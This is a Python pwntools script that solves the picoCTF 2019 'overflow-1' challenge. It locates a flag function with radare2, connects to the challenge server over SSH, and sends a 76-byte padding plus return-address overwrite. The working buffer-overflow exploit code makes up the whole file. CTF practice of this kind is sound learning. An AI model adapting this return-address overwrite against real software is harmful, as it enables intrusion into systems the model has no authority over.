import r2pipe
from pwn import *


def get_target_return_addr():
    """Pulls target return addr from local copy of binary using radare2"""
    radare2 = r2pipe.open("vuln")
    radare2.cmd("aaaa")
    ret_addr = radare2.cmd("afl~flag").split()[0]
    # Convert hex string to hex number
    return int(ret_addr, 16)


def main():

    # Connect to server
    conn = ssh(host="2019shell1.picoctf.com",
               port=22,
               user="alichtman",
               ssh_agent=True)

    # Get target return address
    target_return_addr = get_target_return_addr()

    # Construct buffer overflow
    buffer = "A" * 76  # Found with SEGFAULT experimentation
    buffer += p32(target_return_addr).decode("latin-1")
    print(f"BUFFER: {buffer}")

    proc = conn.process(executable="vuln",
                        cwd="/problems/overflow-1_3_f08d494c74b95dae41bff71c2a6cf389")

    # Run the program and input the buffer that will overflow it
    proc.sendlineafter(": ", buffer)
    #  proc.interactive()
    output = proc.recvall().decode()
    flag = output.split("\n")[2]
    print(f"\nFLAG: {flag}")


if __name__ == "__main__":
    main()
